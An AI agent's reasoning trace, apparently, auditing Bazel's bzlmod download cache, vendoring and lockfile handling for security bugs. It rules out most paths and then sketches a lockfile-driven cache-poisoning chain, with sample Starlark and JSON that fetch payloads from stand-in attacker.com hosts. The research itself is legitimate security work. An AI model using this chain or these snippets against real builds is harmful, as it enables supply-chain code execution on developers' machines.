If `patches` are not fetched during module resolution, they are NOT in `registryFileHashes`.
So `bazel vendor` does NOT fetch `patches` into the `registries/...` directory?
Wait! In `VendorCommand.java`:
```java
    // 2. Vendor repos
    Path externalPath = ...
    vendorManager.vendorRepos(externalPath, env.getDirectories().getWorkspace(), reposToVendor);
```
`vendorRepos` vendors the ENTIRE REPOSITORY (after `http_archive` has extracted it and applied patches).
So patches are downloaded when the repo is fetched, and applied to the repo, and the patched repo is vendored!
So `bazel vendor` DOES NOT download patches to the `registries/` directory!
This confirms my earlier conclusion: the URL path traversal in `vendorRegistryUrl` is completely dead because an attacker cannot inject `../` into the fixed filenames (`source.json`, `MODULE.bazel`, etc.).

Let's examine Lockfile Poisoning again.
Can an attacker modify `MODULE.bazel.lock` to inject malicious repos?
Yes, but as discussed, this is modifying a checked-in file in the attacker's PR. The attacker can already modify `BUILD` files. It's essentially "user builds untrusted code".
Unless the victim checks out the PR and JUST runs `bazel build @malicious_repo//:foo`? No, the victim runs `bazel build //...`. If the malicious repo is not depended on, it's not built. If it is depended on, the `BUILD` file must be changed, which the victim reviews.

What about Cache Confusion / Cache Materialization?
If `DownloadManager` saves a file to `downloadCache` without `checksum` using the file's SHA256.
What if `http_archive` extracts a TAR file, and the TAR file contains a symlink that points to an attacker-controlled location outside the external repo directory?
Wait, I already checked decompression symlinks, they are safely re-rooted or throw `IOException`.

What about `repository_ctx.download` where `output` is controlled by the user?
`ctx.download(url, output)`
If a module extension calls `ctx.download("https://attacker.com/malicious", "/etc/passwd")`.
The `output` is `/etc/passwd`.
`StarlarkBaseExternalContext.java` checks:
```java
  protected void checkInOutputDirectory(String operation, StarlarkPath path) throws EvalException {
    if (!path.getPath().startsWith(outputDirectory)) {
      throw Starlark.errorf(
          "Cannot %s outside of the repository directory for path %s", operation, path);
    }
  }
```
If `output` is `/etc/passwd`, it resolves to `/tmp/bazel/external/repo/etc/passwd`, which starts with `outputDirectory`.
If `output` is `../../../../etc/passwd`, it resolves to `/etc/passwd`.
Then `!path.getPath().startsWith(outputDirectory)` evaluates to true.
So it throws `EvalException`.
This is safe.

What about `repository_ctx.extract`?
Same check.

What about `repository_ctx.patch`?
`PatchUtil.java` checks `!filePath.startsWith(outputDirectory)`.

What about `repository_ctx.symlink`?
```java
    StarlarkPath targetPath = getPath(target);
    StarlarkPath linkNamePath = getPath(linkName);
    checkInOutputDirectory("symlink", linkNamePath);
    makeDirectories(linkNamePath.getPath());
    try {
      FileSystemUtils.ensureSymbolicLink(linkNamePath.getPath(), targetPath.getPath());
    }
```
`checkInOutputDirectory` verifies `linkNamePath` is inside the repo.
`targetPath` can be outside the repo!
`ctx.symlink("/etc/passwd", "passwd")`.
This creates a symlink `passwd` -> `/etc/passwd`.
This is allowed!
But it's just a symlink. You can already do this with `ctx.symlink`. It doesn't write to `/etc/passwd`.

What about `repository_ctx.template`?
```java
    StarlarkPath templatePath = getPath(template);
    StarlarkPath outputPath = getPath(output);
    checkInOutputDirectory("write", outputPath);
```
Output is checked.

What about `repository_ctx.file`?
Output is checked.
Wait, what about `SingleExtensionEvalFunction.java` and `BazelLockFileFunction.java` parsing `MODULE.bazel.lock` and the `RepoSpec` classes?
Is there a deserialization vulnerability?
`GsonTypeAdapterUtil` is used to deserialize `MODULE.bazel.lock`.
It uses `Gson`, which is generally safe against arbitrary object instantiation if classes are explicitly specified.
`TypeAdapter` is defined for `RepoSpec`.
```java
  public static final Gson SINGLE_EXTENSION_USAGES_VALUE_GSON = ...
```

What about `ModuleExtensionContext.java`?
Is there any place where the registry URL is used to execute code?
"generated files/manifests later consumed by trusted host-side logic"
`MODULE.bazel.lock` is a generated file.
If it is consumed by `BazelLockFileFunction.java`, we saw it just trusts the output of the module extension.
Is there any OTHER generated file?
`bzlmod` generates `.bzl` files?
In `VendorManager.java`:
```java
        // 6. Leave a symlink in external dir to keep things working.
        repoUnderExternal.deleteTree();
        FileSystemUtils.ensureSymbolicLink(repoUnderExternal, repoUnderVendor);
```
`vendorManager.vendorRepos` moves the repo from `externalPath/repo` to `vendorDirectory/repo` and leaves a symlink at `externalPath/repo` pointing to `vendorDirectory/repo`.
Wait... if the `vendorDirectory` contains the repo...
If the user runs `bazel build`, and `--vendor_dir` is used...
In `RepositoryDirectoryValue.java` or `RepositoryDelegatorFunction.java`:
If `--vendor_dir` is used, Bazel looks in the vendor directory instead of fetching!
```java
        if (vendorDirectory != null) {
          Path vendorRepoPath = vendorDirectory.getRelative(repositoryName.getName());
          if (vendorRepoPath.exists()) {
...
```
If an attacker provides a zip file with `foo.tar.gz` and `bazel vendor` extracts it.
The attacker's repo is stored in the vendor directory.
Is there any vulnerability where the attacker controls the vendor path?
```java
          Path vendorRepoPath = vendorDirectory.getRelative(repositoryName.getName());
```
`repositoryName.getName()` is checked to be a valid module name.
So it cannot contain `../`.

What about Cache keys and Cache materialization?
`DownloadCache.java` uses `String cacheKey = checksum.get().toString()`.
`checksum.get()` is from the repo rule.
If `checksum` is SHA256. The file is saved at `~/.cache/bazel/.../cas/sha256/<hash>`.
If the user runs `bazel clean --expunge`, it deletes the output base. But NOT the cache directory!
So the cache persists across workspaces.
Is there any way to write a file to the cache with a fake hash?
If `checksum` is absent, it fetches the file and puts it under its REAL SHA256 hash.
If `checksum` is present, it checks if the cache has it. If not, it fetches it and puts it under `checksum`.
Wait... if `checksum` is present, does it verify the fetched file's hash BEFORE putting it in the cache?
In `DownloadManager.java`:
```java
    for (int attempt = 0; ; ++attempt) {
      try {
        downloader.download(..., checksum, ...);
```
If `downloader.download` fetches the file, it passes `checksum` to `downloader.download`.
In `HttpDownloader.java`:
```java
        content = httpDownloader.downloadAndReadOneUrl(url, credentials, checksum, eventHandler, clientEnv);
```
Wait! Does `downloader.download` verify the checksum?
Let's see `HttpDownloader.java`!
Wait, `HttpConnectorMultiplexer` returns an `HttpStream`.
`HttpStream` wraps the input stream and verifies the checksum.
Where is `HashInputStream` or `Checksum` verified?
In `HashInputStream`? Let's check `HashInputStream`.
In `src/main/java/com/google/devtools/build/lib/bazel/repository/downloader/HashInputStream.java`.
It extends `FilterInputStream`. When `close()` or EOF is reached, it verifies the checksum!
So `DownloadManager` will get an `IOException("Checksum mismatch")` when reading from the `HttpStream`!
Thus, it CANNOT write a poisoned file to the cache!

What about "metadata/filepath consumption bugs where BOTH:
 1. the target directory/path selection is attacker-influenced
 2. the final written filename or consumed artifact identity is also attacker-influenced"

We must find something that lets the attacker control BOTH.
Wait! What about `repository_ctx.download` where `output` is controlled?
We already saw `checkInOutputDirectory` validates it against the repo root.
But what if the attacker uses an absolute path?
`repository_ctx.download("https://malicious", "/tmp/pwned")`
`getPath("/tmp/pwned")` returns a `StarlarkPath` with `path` resolving to `/tmp/bazel/external/repo/tmp/pwned`!
Because Starlark paths are relative to the repository!
Let's see `StarlarkBaseExternalContext.java`:
```java
  protected StarlarkPath getPath(Object obj) throws EvalException {
    return new StarlarkPath(StarlarkPath.getPath(os, outputDirectory, obj));
  }
```
In `StarlarkPath.java`:
```java
  public static Path getPath(StarlarkOS os, Path outputDirectory, Object obj) throws EvalException {
    if (obj instanceof String) {
      return outputDirectory.getRelative((String) obj);
    } else if (obj instanceof StarlarkPath) {
      return ((StarlarkPath) obj).getPath();
    } else {
...
```
`outputDirectory.getRelative((String) obj)`:
If `obj` is `/etc/passwd`, `outputDirectory.getRelative("/etc/passwd")` returns `/etc/passwd`!
Wait! `Path.getRelative` on an ABSOLUTE string returns the absolute path!
```java
  public Path getRelative(String other) {
    checkNotNull(other);
    return new Path(pathFragment.getRelative(other), fileSystem);
  }
```
If `other` is an absolute path (e.g. `/etc/passwd`), `PathFragment.getRelative("/etc/passwd")` returns `PathFragment.create("/etc/passwd")`!
So `StarlarkPath.getPath` returns `/etc/passwd`.
Then `checkInOutputDirectory`:
```java
  protected void checkInOutputDirectory(String operation, StarlarkPath path) throws EvalException {
    if (!path.getPath().startsWith(outputDirectory)) {
      throw Starlark.errorf(
          "Cannot %s outside of the repository directory for path %s", operation, path);
    }
  }
```
`path.getPath()` is `/etc/passwd`.
`outputDirectory` is `/tmp/bazel-out/external/repo`.
`/etc/passwd`.startsWith(`/tmp/bazel-out/external/repo`) is FALSE!
So it throws `EvalException("Cannot write outside of the repository directory for path /etc/passwd")`!
So absolute paths are ALSO CAUGHT!

Is there any path selection in `MODULE.bazel` that does NOT check `startsWith(outputDirectory)`?
In `bzlmod`, `archive_override` specifies `module_name`, `urls`, `integrity`, `strip_prefix`, `patches`, `patch_cmds`, etc.
What about `local_path_override`?
```starlark
local_path_override(
    module_name = "foo",
    path = "/etc/passwd",
)
```
This tells Bazel that module `foo` is located at `/etc/passwd`.
If another project depends on `foo`, it reads from `/etc/passwd`.
But `local_path_override` ONLY takes effect in the root module!
If an attacker publishes a module to a registry, `local_path_override` in their module is IGNORED!
So an attacker CANNOT use `local_path_override` to read the victim's files!
What about `bazel_registry.json` mirrors?
What about `SingleExtensionEvalFunction` lockfile parsing?
"the final written filename or consumed artifact identity is also attacker-influenced enough to create real impact"
Is the lockfile poisoning valid under this?
If an attacker changes the `MODULE.bazel.lock` to inject a malicious repo:
1. Target directory/path selection: The injected repo name `@malicious_repo` is the target directory for the repo.
2. Final consumed artifact identity: The URL and SHA256 of the malicious tarball!
Wait, if the user builds a target that depends on the malicious repo.
If the malicious repo name matches an EXISTING repo, the attacker hijacks that repo.
The `SingleExtensionEvalFunction` evaluates the lockfile and returns the attacker's `RepoSpec`.
Then Bazel uses that `RepoSpec` to fetch the repo!
Does this fit "metadata consumption bug"?
Yes, the lockfile is metadata. The bug is that it's consumed without verifying the output matches the inputs!
Is the real impact code execution?
Yes, fetching an attacker's `http_archive` means executing the attacker's `BUILD` file.
But wait! Is the attacker's `MODULE.bazel.lock` checked into the victim's repository?
Yes. The attacker creates a PR to the victim's repository, modifying `MODULE.bazel.lock`.
If the victim merges it, the attacker achieves RCE on anyone building the repo.
But if the attacker submits a PR, they can also just add a malicious `BUILD` file to the PR!
"Why triage may reject it: local-only self-attack / attacker already has RCE by modifying BUILD files."
BUT reviewers REVIEW `BUILD` files carefully!
Reviewers DO NOT review `MODULE.bazel.lock` carefully! It's a 10,000 line generated JSON file.
So this is a supply-chain attack via review bypass.
Is this a "metadata/filepath consumption bug"?
"reviewed metadata != consumed runtime state" fits perfectly!
Let's see if this matches the prompt instructions:
"reviewed metadata != consumed runtime state"
The reviewed metadata is the `MODULE.bazel.lock`. Wait, the `MODULE.bazel.lock` IS the consumed runtime state.
Ah!
If `MODULE.bazel.lock` is modified, the reviewer sees the lockfile change.
But what if the lockfile says:
```json
{
  "generatedRepoSpecs": {
    "rules_python": {
      "bzlFile": "@bazel_tools//tools/build_defs/repo:http.bzl",
      "ruleClassName": "http_archive",
      "attributes": {
        "urls": ["https://attacker.com/rules_python.zip"]
      }
    }
  }
}
```
The reviewer sees `https://attacker.com/rules_python.zip`. They MIGHT miss it.
But it is explicitly in the lockfile!
Is there a way where `reviewed metadata != consumed runtime state`?
If `MODULE.bazel.lock` uses `attributes` but Bazel DOES NOT verify it?
Bazel DOES consume the `generatedRepoSpecs`!
But wait, if the attacker just modifies `.bzl` or `BUILD` files, they can also achieve RCE.

Is there a bug where the *cache key* does not cover the URL, so an attacker can poison the cache?
If `checksum` is absent, the cache key is the SHA256 of the fetched file.
If `checksum` is present, the cache key is `checksum.get().toString()`.
What if `repository_ctx.download` fetches a file, and the user specifies `executable = True`?
Wait, let's look at `bzlmod` `Selection` logic!
In `Selection.java`:
```java
        case "single_version_override" -> {
          // single_version_override(...)
```
What if an attacker uses `single_version_override` for a module in a transitive dependency?
We know that `single_version_override` is ONLY evaluated in the ROOT module!
What about `multiple_version_override`? ONLY in the ROOT module!
What about `patch_cmds`? ONLY in the ROOT module!

What if `BazelDepGraphFunction` has a confused deputy?
"confused deputy in repository fetching/materialization"
If `bazel_dep` asks for `rules_python` 1.0, and the registry says the URL is `https://rules_python.zip`, it downloads it.
If `archive_override` specifies `https://rules_python.zip`, it downloads it.

What if `vendorManager` reads `bazel_registry.json` and caches it?
Is there any SSRF? We checked URL schemes.

Let's look at `DownloadManager`.
Are there any other HTTP clients?
`HttpConnector` uses `connection = (HttpURLConnection) url.toURL().openConnection(proxyInfo.proxy());`
Does it verify the hostname against TLS certificate? Yes, standard Java does.

Wait...
What if `http_archive` extracts to a path with directory traversal?
We already proved it's caught.

What if `repo_mapping` contains `..`?
`repo_mapping = {"..": "attacker"}`?
In `RepositoryName.java`, module names cannot contain `..`.
```java
  public static final Pattern VALID_MODULE_NAME = Pattern.compile("[a-z]([a-z0-9._-]*[a-z0-9])?");
```
Wait! `VALID_MODULE_NAME` allows `a..a`.
What if the module name is `a..a`? That's fine.

What if `RepoRuleId` or `ModuleKey` can contain traversal?
No, validated.

What about `Downloader` canonical ID handling?
"canonical_id: If set to a non-empty string, restrict cache hits to those cases, where the entry with the given cacheKey was added with this String given."
In `DownloadCache.java`:
```java
    String idHash = keyType.newHasher().putString(canonicalId, UTF_8).hash().toString();
    return keyType.getCachePath(path).getChild(cacheKey).getChild(ID_PREFIX + idHash).exists();
```
This is safe.

What about `ProxyHelper.java`?
If `clientEnv` contains `HTTP_PROXY`, it uses the proxy.
Can the attacker control `clientEnv`?
Repository rules receive `clientEnv` from `repository_ctx.os.environ` or `--action_env`.
If the attacker controls `clientEnv`, they control the build.

What about `Checksum`?
```java
  public static Checksum fromString(String checksum) throws InvalidChecksumException {
...
```
Is there any weakness in `Checksum`?
```java
    String[] parts = checksum.split("-", 2);
    if (parts.length == 1) {
      // If there is no type prefix, it must be SHA-256.
      return new Checksum(KeyType.SHA256, parts[0]);
    }
```
If `parts[0]` is a valid KeyType, it uses it.
If an attacker uses `md5-xyz`? MD5 is NOT supported. Only `sha1`, `sha256`, `sha384`, `sha512`, `sri`.

Is there any bug where `DownloadManager` saves a file, but the name is predictable and the attacker can write to it?
No, it writes to the repository directory.

Is there any "reviewed metadata != consumed runtime state"?
If `MODULE.bazel` is evaluated.
```starlark
bazel_dep(name = "foo", version = "1.0")
```
The registry resolves `foo` 1.0 to `https://foo.zip` with integrity `sha256-abc`.
The lockfile stores:
```json
  "moduleDepGraph": {
    "foo@1.0": {
      "repoSpec": {
        "bzlFile": "@bazel_tools//tools/build_defs/repo:http.bzl",
        "ruleClassName": "http_archive",
        "attributes": {
          "urls": ["https://foo.zip"],
          "integrity": "sha256-abc"
        }
      }
    }
  }
```
Wait! `BazelModuleResolutionFunction` uses the lockfile for the dependency graph!
If an attacker modifies the lockfile to change `urls` to `https://attacker.com/foo.zip` and `integrity` to `sha256-xyz`.
BUT the PR reviewer sees `bazel_dep(name="foo", version="1.0")` in `MODULE.bazel`.
The reviewer thinks: "Ah, it's just `foo` 1.0 from the central registry".
They DO NOT review the lockfile.
When the victim checks out the PR and builds, Bazel reads the lockfile!
Does Bazel verify that the lockfile's `repoSpec` MATCHES the registry's `source.json`?
Let's check `BazelLockFileFunction.java` and `BazelModuleResolutionFunction.java`!
Wait, `BazelModuleResolutionFunction` DOES NOT load `repoSpec` from the lockfile?
The lockfile only stores:
- `moduleExtensions`: `LockFileModuleExtension` (which has `generatedRepoSpecs`)
- `registryFileHashes`
- `selectedYankedVersions`
- `lockFileVersion`
Wait! It does NOT store `repoSpecs` for the dependencies in `MODULE.bazel`?
Let's see what `BazelLockFileValue` contains!
Ah, the lockfile DOES NOT contain the module dependency graph!
It only contains `registryFileHashes`!
Wait! `BazelModuleResolutionFunction` computes the module graph, and whenever it fetches a registry file, it checks the hash against `lockfile.getRegistryFileHashes()`!
Wait, if it checks the hash, what if the attacker changes `registryFileHashes`?
In `RegistryFunction.java`:
```java
        Optional<Checksum> expectedChecksum = registryFileHashes.get(url);
        if (expectedChecksum != null && expectedChecksum.isPresent()) {
          checksum = expectedChecksum;
        }
```
If the attacker changes `bazel_registry.json` or `source.json` hash in the lockfile to match their own malicious server?
But the registry URL itself is NOT from the lockfile! The registry URL is from `--registry`.
If the user's `--registry` is trusted, the server is trusted.
Wait! What if the attacker changes `registryFileHashes` for `bcr.bazel.build`?
The downloader fetches from `bcr.bazel.build`. It receives the real file.
Then the hasher hashes it. It DOES NOT MATCH the attacker's fake hash in the lockfile!
So `vendorManager` or `downloader` throws `Checksum mismatch`!
So the attacker cannot use `registryFileHashes` to poison anything!

What about `moduleExtensions`?
We already determined that modifying `moduleExtensions` in the lockfile allows bypassing the `.bzl` extension execution and injecting arbitrary `RepoSpec`s!
BUT the attacker can already modify `BUILD` files to run code.
Is there any scenario where `MODULE.bazel.lock` modification is considered a "metadata/filepath consumption bug"?
"Find metadata/filepath consumption bugs where BOTH: 1. the target directory/path selection is attacker-influenced 2. the final written filename or consumed artifact identity is also attacker-influenced enough to create real impact"
A lockfile repo injection does NOT influence the directory/path. It just injects a repo.

What about `HttpDownloader.java`?
Are there any other cache keys?
"Find metadata/filepath consumption bugs where BOTH:
 1. the target directory/path selection is attacker-influenced
 2. the final written filename or consumed artifact identity is also attacker-influenced enough to create real impact"

Let's look for usages of `getRelative(String)` or `PathFragment.create(String)` in downloader or cache logic where the string comes from an untrusted source, like a registry or downloaded file.
In `IndexRegistry.java`:
```java
    if (bazelRegistryJson.isPresent()) {
      String moduleBasePath = bazelRegistryJson.get().moduleBasePath;
      if (moduleBasePath != null && !moduleBasePath.isEmpty()) {
        URI uri;
        try {
          uri = new URI(getUrl() + "/" + moduleBasePath + "/" + path).normalize();
        } catch (URISyntaxException e) {
```
`path` is `sourceJson.path` for `local_path`.
If the user specifies a registry URL `file:///tmp/registry`, the user trusts it.

Let's check `HttpConnector.java`:
If a redirect uses `url = HttpUtils.getLocation(connection)`.
Does `getLocation` have any URL validation? No, we saw that it accepts `file:///`. But it fails down the line.
Does it accept `http://localhost/`? Yes, SSRF, but no capability delta.

Let's check `UrlRewriter.java`:
```java
  public ImmutableList<RewrittenURL> rewrite(URI url) {
...
```
It reads `bazel_downloader.cfg`. It is a local file.

What about `CacheProgress` or `DownloadCache`?
```java
    Path cacheEntry = keyType.getCachePath(path).getChild(cacheKey);
    Path cacheValue = cacheEntry.getChild(DEFAULT_CACHE_FILENAME);
```
Here `cacheKey` is verified by regex.

What about `canonicalId` in `DownloadCache.java`?
```java
  public Path get(
      String cacheKey, Path targetPath, KeyType keyType, String canonicalId, boolean mayHardlink)
```
`canonicalId` is hashed:
```java
  boolean hasCanonicalId(String cacheKey, KeyType keyType, String canonicalId) {
    String idHash = keyType.newHasher().putString(canonicalId, UTF_8).hash().toString();
    return keyType.getCachePath(path).getChild(cacheKey).getChild(ID_PREFIX + idHash).exists();
  }
```
No traversal.

What about `Checksum.java`?
```java
  public static Checksum fromString(String checksum) throws InvalidChecksumException {
    String[] parts = checksum.split("-", 2);
    if (parts.length == 1) {
      // If there is no type prefix, it must be SHA-256.
      return new Checksum(KeyType.SHA256, parts[0]);
    }
```
Does it allow directory traversal if `parts[0]` is a directory traversal?
```java
    KeyType keyType = KeyType.fromString(parts[0]);
```
`KeyType.fromString` only returns known `KeyType`s.
So `parts[0]` must be `sha256`, `sha1`, etc.

What about `DownloadManager.getDownloadDestination`?
```java
  private Path getDownloadDestination(URI url, Optional<String> type, Path output) {
    if (!type.isPresent()) {
      return output;
    }
    String basename =
        MoreObjects.firstNonNull(
            Strings.emptyToNull(PathFragment.create(url.getPath()).getBaseName()), "temp");
    if (!type.get().isEmpty()) {
      String suffix = "." + type.get();
      if (!basename.endsWith(suffix)) {
        basename += suffix;
      }
    }
    // The basename may contain characters that aren't legal in a path with all file systems. Those
    // characters won't matter for type determination.
    return output.getRelative(FS_UNSAFE_CHARS.replaceFrom(basename, '_'));
  }
```
`FS_UNSAFE_CHARS` prevents `/` from appearing in the filename.
```java
  private static final CharMatcher FS_UNSAFE_CHARS =
      CharMatcher.inRange('a', 'z')
          .or(CharMatcher.inRange('A', 'Z'))
          .or(CharMatcher.inRange('0', '9'))
          .or(CharMatcher.anyOf("-._()"))
          .negate();
```
`/` is NOT in `FS_UNSAFE_CHARS`.
Wait! `FS_UNSAFE_CHARS.replaceFrom(basename, '_')` replaces all unsafe characters with `_`.
`/` is unsafe! So `/` is replaced by `_`!
So it CANNOT contain `/`!
So `getDownloadDestination` is 100% safe.
What about `DownloadCache.java`'s `put` method?
If `keyType.isValid(cacheKey)` checks for hex string.
`cacheKey` is hex string.
So it's safe.

What about `LocalRepoContentsCache.java`?
If `predeclaredInputHash` is `../../etc`?
It is computed using `Fingerprint().hash()`, which is a hex string.

What about `ModuleExtensionContext.java`?
Is there any file path manipulation?
`File` objects or `Label` objects?

Let's check `StarlarkBaseExternalContext.java`.
Is there any path traversal in `execute`?
`starlarkBaseExternalContext.execute` takes a command array.
It runs it using `Command`.
If an attacker controls the command array, they control the command. But it's an intended feature.

What about `BazelDepGraphFunction.java`?
What if a module name in `MODULE.bazel` specifies a `module_name` with directory traversal?
We know `VALID_MODULE_NAME` strictly prevents it.

What about `RepoSpecFunction.java`?
Wait, `RepoSpecFunction` fetches `repoSpec` from the `Registry`.
In `RegistryFunction.java`:
```java
    try {
      return RegistryFactoryImpl.createRegistry(
          key.url(),
          lockfile.getRegistryFileHashes(),
          lockfile.getSelectedYankedVersions(),
...
```
`lockfile.getRegistryFileHashes()` is passed to the registry!
Wait. Earlier I asked: "If the attacker changes `bazel_registry.json` or `source.json` hash in the lockfile to match their own malicious server? ... But the registry URL itself is NOT from the lockfile! The registry URL is from `--registry`... The downloader fetches from `bcr.bazel.build`. It receives the real file... It DOES NOT MATCH the attacker's fake hash in the lockfile!"

Wait! Is there ANY other use of `lockfile.getRegistryFileHashes()`?
Let's see `IndexRegistry.java`:
```java
  private byte[] grabFile(
      String url,
      ExtendedEventHandler eventHandler,
      DownloadManager downloadManager,
      boolean useChecksum)
      throws IOException, InterruptedException {
    Optional<Checksum> checksum = Optional.empty();
    if (useChecksum) {
      if (registryFileHashes.containsKey(url)) {
        Optional<Checksum> expectedChecksum = registryFileHashes.get(url);
        if (expectedChecksum != null && expectedChecksum.isPresent()) {
          checksum = expectedChecksum;
        }
      }
    }
...
      byte[] maybeContent = null;
      if (downloadManager != null) {
        maybeContent =
            downloadManager.getBytesFromCache(url, checksum.orElse(null), /* canonicalId= */ null);
      }
      if (maybeContent != null) {
        return maybeContent;
      }
...
      maybeContent = doGrabFile(downloadManager, url, useChecksum);
...
```
If `registryFileHashes` contains the URL!
And `registryFileHashes` is populated from the lockfile!
Wait. If the lockfile contains a hash for the URL `https://bcr.bazel.build/modules/foo/1.0/source.json`.
And the attacker modifies the lockfile to change that hash to `sha256-attackerHash`.
If `DownloadManager` has `downloadCache.isEnabled()`.
`downloadManager.getBytesFromCache(url, checksum.orElse(null), ...)`
Wait, `DownloadManager.getBytesFromCache` does:
```java
  public byte[] getBytesFromCache(String url, Checksum checksum, String canonicalId)
      throws IOException {
    if (!isEnabled() || checksum == null) {
      return null;
    }
    String cacheKey = checksum.toString();
    try {
      return getBytes(cacheKey, checksum.getKeyType());
```
It looks up the file in the cache BY ITS CHECKSUM!
If the attacker changes the checksum in the lockfile to `sha256-attackerHash`.
And the attacker's repository (checked out by the victim) ALSO contains a `http_archive` that fetched `attackerHash`?
Wait! If the attacker's `MODULE.bazel` contains an `archive_override` or `http_archive` with `sha256 = attackerHash` and `urls = ["https://attacker.com/malicious.json"]`.
Bazel fetches `malicious.json` and puts it in the cache under `attackerHash`.
Then `IndexRegistry` tries to fetch `https://bcr.bazel.build/modules/foo/1.0/source.json`.
It looks up `registryFileHashes` in the lockfile, which the attacker set to `attackerHash`.
It asks the cache for `attackerHash`.
The cache RETURNS the `malicious.json`!!!
Because the cache is content-addressable!
So `IndexRegistry` reads `malicious.json` instead of fetching the real `source.json` from BCR!
This is Cache Poisoning via Lockfile!

Let's trace this!
1. Attacker creates a PR.
2. In `MODULE.bazel.lock`, they modify the hash for `https://bcr.bazel.build/modules/foo/1.0/source.json` to `sha256-malicious`.
3. In `MODULE.bazel`, they add an `http_archive` (or `archive_override`) for a dummy repo:
```starlark
archive_override(
    module_name = "dummy",
    urls = ["https://attacker.com/malicious_source.json"],
    integrity = "sha256-malicious"
)
```
Wait, `archive_override` fetches it during module resolution!
But module resolution happens BEFORE `IndexRegistry` needs `source.json`?
Yes, `archive_override` resolves the root module's dependencies.
Wait, if `archive_override` is used, it uses `DownloadManager.startDownload` which caches it.
Does it cache it in the SAME `DownloadCache`?
Yes! All downloads share the same `DownloadCache`!
In `DownloadManager.java`, `downloadCache` is shared!
```java
    if (isCachingByProvidedChecksum) {
      downloadCache.put(
          checksum.get().toString(), destination, checksum.get().getKeyType(), canonicalId);
    }
```
If the attacker's `archive_override` specifies `integrity = sha256-malicious`.
The `malicious_source.json` is downloaded and stored in the cache under `sha256-malicious`.
Then, later, Bazel needs `source.json` for `foo@1.0`.
It checks `lockfile.getRegistryFileHashes()`. The hash is `sha256-malicious`.
It asks `downloadManager.getBytesFromCache(..., checksum = sha256-malicious)`.
The cache RETURNS the content of `malicious_source.json`!
So Bazel parses `malicious_source.json` INSTEAD of the real one!
What can the attacker put in `malicious_source.json`?
They can put:
```json
{
  "type": "archive",
  "url": "https://attacker.com/malicious_repo.zip",
  "integrity": "sha256-malicious_repo_hash"
}
```
So Bazel will download the `foo@1.0` repository from `https://attacker.com/malicious_repo.zip` INSTEAD of the real one!
Then when a target in the user's workspace depends on `@foo`, it builds the attacker's malicious code, achieving ACE!

Wait! Does `bazel build` use the lockfile hash for `source.json`?
Yes! `BazelLockFileFunction` parses `MODULE.bazel.lock` and populates `registryFileHashes`.
Then `RegistryFunction` creates `RegistryFactoryImpl` with it.
Then `IndexRegistry` uses it!
Is there any verification that the lockfile hash matches the remote registry?
NO! Because it finds it in the cache!
Wait, if the file is NOT in the cache?
If the file is not in the cache, `IndexRegistry` calls `doGrabFile(..., useChecksum=true)`.
```java
      byte[] content =
          downloadManager.downloadAndReadOneUrlForBzlmod(originalUrl, clientEnv, checksum);
```
In `DownloadManager.downloadAndReadOneUrlForBzlmod`:
```java
      content =
          httpDownloader.downloadAndReadOneUrl(
              rewrittenUrls.get(0), ...
...
    if (downloadCache.isEnabled()) {
      if (checksum.isPresent()) {
        downloadCache.put(checksum.get().toString(), content, checksum.get().getKeyType());
      }
```
Wait, if it fetches from the network, `downloadAndReadOneUrl` will fetch from `https://bcr.bazel.build/...`!
But the fetched content WILL NOT match `sha256-malicious`!
So it will throw `IOException("Checksum mismatch")`!
But if the attacker PRE-POPULATES the cache, it never fetches from the network!
So it never throws the checksum mismatch!
Wait! How can the attacker pre-populate the cache?
They provide an `archive_override` or `http_archive` with the same `integrity`.
But wait! `DownloadCache` uses `KeyType` (e.g. SHA256) and `canonicalId`?
`DownloadCache.java` uses `canonicalId`.
```java
  public Path get(
      String cacheKey, Path targetPath, KeyType keyType, String canonicalId, boolean mayHardlink)
```
```java
  public byte[] getBytes(String cacheKey, KeyType keyType)
      throws IOException, InterruptedException {
    Path cacheValue = findCacheValue(cacheKey, keyType, /* canonicalId= */ null);
    if (cacheValue == null) {
      return null;
    }
```
`getBytes` DOES NOT USE `canonicalId`!
Because `canonicalId` is passed as `null`!
```java
  @Nullable
  private Path findCacheValue(String cacheKey, KeyType keyType, String canonicalId)
      throws IOException, InterruptedException {
...
    if (!Strings.isNullOrEmpty(canonicalId)) {
      if (!hasCanonicalId(cacheKey, keyType, canonicalId)) {
        return null;
      }
    }
```
If `canonicalId` is null, it skips the check!
And `IndexRegistry` calls `downloadManager.getBytesFromCache` with `canonicalId = null`!
```java
        maybeContent =
            downloadManager.getBytesFromCache(url, checksum.orElse(null), /* canonicalId= */ null);
```
So ANY file in the global repository cache that has the matching SHA256 can be used to spoof `source.json`!
So if an attacker forces the user to download a file with `integrity = sha256-malicious`, it goes into the cache.
How can the attacker force the user to download the file?
By declaring a dependency in `MODULE.bazel`:
```starlark
bazel_dep(name = "malicious_dep", version = "1.0")
```
Wait, the attacker controls `MODULE.bazel` anyway! They can just add `bazel_dep` or `http_archive`.
Wait... if the attacker controls `MODULE.bazel`, they control the build. They don't NEED to spoof `source.json` for `foo@1.0`. They can just execute code using their own repository!
"local-only self-attack"
"If the attacker submits a PR, they can just modify BUILD files to achieve RCE."
If this attack requires modifying `MODULE.bazel`, the reviewer will see the new `bazel_dep` or `archive_override`.
BUT what if the attacker ONLY modifies `MODULE.bazel.lock`?
If they only modify the lockfile, they CANNOT use `MODULE.bazel` to pre-populate the cache!
Wait, can they pre-populate the cache using the lockfile itself?
Does the lockfile contain other URLs that are fetched BEFORE `source.json` for `foo@1.0`?
In `MODULE.bazel.lock`, `registryFileHashes` is a map:
```json
  "registryFileHashes": {
    "https://bcr.bazel.build/modules/malicious/1.0/source.json": "sha256-malicious",
    "https://bcr.bazel.build/modules/foo/1.0/source.json": "sha256-malicious"
  }
```
If Bazel fetches `https://bcr.bazel.build/modules/malicious/1.0/source.json`, it fetches it from the network because it's not in the cache yet.
The network returns the REAL file from BCR.
But the REAL file's checksum won't match `sha256-malicious`!
So it throws `IOException("Checksum mismatch")`!
So the attacker CANNOT fetch a fake file from the registry if they don't control the registry server.

Wait! What if the attacker adds a custom registry to the lockfile?
The lockfile DOES NOT specify the registry URL! The registry URL comes from `--registry`.
So `registryFileHashes` uses the user's `--registry`!

Wait, what about `bazel_registry.json` mirrors?
Can the attacker use a mirror to inject a file?
Mirrors are specified in `bazel_registry.json`. The user trusts `bazel_registry.json` from the registry.
Wait! What if `registryFileHashes` in the lockfile has a spoofed hash for `bazel_registry.json`?
Then Bazel fetches `bazel_registry.json` from the registry.
Checksum mismatches. Fails.

What if the attacker provides a `.bazelrc` with a custom `--registry`?
If they provide `.bazelrc`, they control the repo, they can just run RCE directly via `genrule`.
